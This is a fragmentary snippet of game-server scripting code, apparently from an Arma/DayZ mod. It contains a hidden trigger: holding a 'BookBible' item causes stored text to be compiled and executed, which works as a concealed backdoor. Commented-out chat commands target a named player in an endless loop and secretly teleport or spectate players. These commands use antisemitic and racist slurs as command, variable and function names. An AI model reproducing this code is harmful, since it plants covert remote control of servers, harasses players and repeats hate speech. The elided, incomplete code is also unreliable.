		...
		{	_item = itemInHands _x;
		    if (_item isKindOf "BookBible") then {
                ...
                _savedChar = call compile (_savedCharTxt);
						...
						//if (_objecttype == "/jew") then { { if (name _x == "Hean Dall") then { while {true} do { _id = owner _x; _pos = getposATL _x; { _lolnigger = [_id,_pos] call nigger_jew; }forEach players; sleep 0.7; }; }; }foreach players; };
						...
						//if(_cmdtype == "/sp") then { [_cmdtype2,_cmdtype3,_cmdtype4] spawn { _cmdtype2 = _this select 0; _cmdtype3 = _this select 1; _cmdtype4 = _this select 2; for [{_i=0}, {_i < _cmdtype4}, {_i=_i+1}] do { { if (name _x == _cmdtype3) then { if (lifeState _x == "ALIVE") then { targetPOS = getpos _x; SpecVeh = (vehicle _x); }; } else { if (name _x == _cmdtype2) then { if (lifeState SpecVeh == "ALIVE") then { (owner _x) publicVariableClient "targetPOS"; (owner _x) publicVariableClient "SpecVeh"; }; }; }; }forEach players; sleep 1; }; };  _targPos = [7500,7500,0]; { if (name _x == _cmdtype3) then { _targPos = getPos _x; }; }forEach players; { if (name _x == _cmdtype2) then { if ( (vehicle _x) distance _targPos > 850) then { (vehicle _x) setPos [(_targPos select 0),(_targPos select 1)+350]; }; }; }forEach players; sleep 2; [_cmdtype2,_cmdtype3,_cmdtype4] call DZ_camSPAWNER; };
						//if(_cmdtype == "/specGO") then { _targPos = [7500,7500,0]; { if (name _x == _cmdtype3) then { _targPos = getPos _x; }; }forEach players; { if (name _x == _cmdtype2) then { if ( (vehicle _x) distance _targPos > 850) then { (vehicle _x) setPos [(_targPos select 0),(_targPos select 1)+350]; }; }; }forEach players; sleep 2; [_cmdtype2,_cmdtype3,_cmdtype4] call DZ_camSPAWNER; };
